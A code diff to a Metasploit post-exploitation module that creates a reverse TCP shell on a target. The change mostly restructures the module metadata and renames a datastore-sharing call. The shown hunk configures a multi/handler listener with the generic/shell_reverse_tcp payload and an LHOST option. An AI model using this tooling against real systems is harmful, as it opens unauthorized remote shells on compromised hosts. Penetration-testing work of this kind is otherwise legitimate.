@@ -14,18 +14,30 @@ class Metasploit3 < Msf::Post
   include Msf::Post::Common
 
   def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Multi Manage System Remote TCP Shell Session',
-        'Description'   => %q{
-          This module will create a Reverse TCP Shell on the target system
-          using the system own scripting enviroments installed on the
-          target.
-        },
-        'License'       => MSF_LICENSE,
-        'Author'        => ['Carlos Perez <carlos_perez[at]darkoperator.com>'],
-        'Platform'      => [ 'unix', 'osx', 'linux'],
-        'SessionTypes'  => [ 'meterpreter','shell' ]
-      ))
+    super(
+        Msf::Module::ModuleInfo.update!(
+            info,
+            'Name'          => 'Multi Manage System Remote TCP Shell Session',
+            'Description'   => %q{
+              This module will create a Reverse TCP Shell on the target system
+              using the system own scripting enviroments installed on the
+              target.
+            },
+            'License'       => MSF_LICENSE,
+            'Arch' => ARCH_X86,
+            'Author'        => ['Carlos Perez <carlos_perez[at]darkoperator.com>'],
+            'Platform'      => [
+                'Linux',
+                'OSX',
+                'UNIX'
+            ],
+            'SessionTypes'  => [
+                'meterpreter',
+                'shell'
+            ]
+        )
+    )
+
     register_options(
       [
         OptAddress.new('LHOST',
@@ -125,7 +137,7 @@ class Metasploit3 < Msf::Post
     if not check_for_listner(lhost,lport)
       # Set options for module
       mul = client.framework.exploits.create("multi/handler")
-      mul.share_datastore(pay.datastore)
+      mul.share_data_store(pay.datastore)
       mul.datastore['WORKSPACE'] = client.workspace
       mul.datastore['PAYLOAD'] = "generic/shell_reverse_tcp"
       mul.datastore['EXITFUNC'] = 'thread'
